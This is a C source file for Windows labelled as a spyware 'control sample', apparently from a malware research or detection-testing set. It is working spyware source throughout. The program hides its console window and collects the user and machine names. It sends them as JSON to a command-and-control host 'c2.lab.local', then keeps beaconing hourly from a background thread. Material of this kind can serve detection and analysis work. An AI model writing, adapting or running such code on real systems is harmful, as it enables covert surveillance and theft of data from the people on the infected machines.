/*
   A04_4: Spyware Data Pipeline Control Sample
   Behavioral Scope: Local system metric aggregation and HTTP serialization.
   Webcam, video processing, and persistence elements are omitted.
*/

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib") // Required for GetUserNameA
#pragma comment(lib, "user32.lib")   // Required for ShowWindow and GetConsoleWindow

// Laboratory Configuration Constraints
const char *SERVER_HOST = "c2.lab.local";
const char *SERVER_PATH = "/api/v1/report";
const int SERVER_PORT = 80;

// Global Structural Telemetry Containers
char username[256] = {0};
char computer_name[256] = {0};

void gather_static_identity()
{
    DWORD size = sizeof(username);
    if (!GetUserNameA(username, &size))
    {
        strcpy_s(username, sizeof(username), "Unknown_User");
    }

    size = sizeof(computer_name);
    if (!GetComputerNameA(computer_name, &size))
    {
        strcpy_s(computer_name, sizeof(computer_name), "Unknown_Host");
    }
}

void get_timestamp(char *buffer, size_t buffer_size)
{
    time_t rawtime;
    struct tm timeinfo;
    time(&rawtime);
    localtime_s(&timeinfo, &rawtime);
    strftime(buffer, buffer_size, "%Y-%m-%d %H:%M:%S", &timeinfo);
}

void exfiltrate_data(const char *json_payload)
{
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    // Initialize the WinINet session
    hInternet = InternetOpenA("DataPipelineAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        printf("[ERROR] InternetOpenA failed. Error: %lu\n", GetLastError());
        return;
    }

    // Establish communication block to host destination
    hConnect = InternetConnectA(hInternet, SERVER_HOST, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL)
    {
        printf("[ERROR] InternetConnectA failed. Error: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return;
    }

    // Open an HTTP POST request handle
    hRequest = HttpOpenRequestA(hConnect, "POST", SERVER_PATH, NULL, NULL, NULL, 0, 0);
    if (hRequest == NULL)
    {
        printf("[ERROR] HttpOpenRequestA failed. Error: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    // Define standard application layer headers
    const char *headers = "Content-Type: application/json\r\n";
    DWORD headers_len = (DWORD)strlen(headers);

    // Transmit serialization stream to laboratory server
    BOOL bSend = HttpSendRequestA(hRequest, headers, headers_len, (LPVOID)json_payload, (DWORD)strlen(json_payload));
    if (bSend)
    {
        printf("[INFO] Data exfiltration successful\n");
    }
    else
    {
        printf("[ERROR] HttpSendRequestA failed. Error: %lu\n", GetLastError());
    }

    // Free resources safely
    HttpEndRequest(hRequest, NULL, 0, 0);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void log_login_info()
{
    char time_buffer[64] = {0};
    char json_buffer[1024] = {0};
    get_timestamp(time_buffer, sizeof(time_buffer));

    // Manually format a standard, valid JSON string layout
    sprintf_s(json_buffer, sizeof(json_buffer),
              "{\n"
              "  \"username\": \"%s\",\n"
              "  \"computer_name\": \"%s\",\n"
              "  \"login_time\": \"%s\"\n"
              "}",
              username, computer_name, time_buffer);

    exfiltrate_data(json_buffer);
}

void log_location()
{
    char time_buffer[64] = {0};
    char json_buffer[1024] = {0};
    get_timestamp(time_buffer, sizeof(time_buffer));

    // Abstract telemetry block packaging placeholder context
    sprintf_s(json_buffer, sizeof(json_buffer),
              "{\n"
              "  \"username\": \"%s\",\n"
              "  \"computer_name\": \"%s\",\n"
              "  \"status\": \"location_heartbeat\",\n"
              "  \"time\": \"%s\"\n"
              "}",
              username, computer_name, time_buffer);

    exfiltrate_data(json_buffer);
}

DWORD WINAPI PipelineWorkerThread(LPVOID lpParam)
{
    // Periodic processing loop mirroring Python's main logic
    while (TRUE)
    {
        log_location();
        Sleep(3600000); // Wait exactly 1 hour (3,600,000 milliseconds)
    }
    return 0;
}

int main()
{
    // Hide native prompt frame during data execution phase
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Initialize global identifiers
    gather_static_identity();

    // Execute first data dispatch action
    log_login_info();

    // Create a background worker thread via Win32 process APIs
    HANDLE hThread = CreateThread(NULL, 0, PipelineWorkerThread, NULL, 0, NULL);
    if (hThread == NULL)
    {
        printf("[ERROR] CreateThread failed. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[INFO] HTTP JSON data exfiltration pipeline running in the background successfully\n");

    // Keep the main execution context alive to support background thread operations
    // In your lab, press Ctrl+C to terminate execution manually
    while (TRUE)
    {
        Sleep(10000);
    }

    CloseHandle(hThread);
    return 0;
}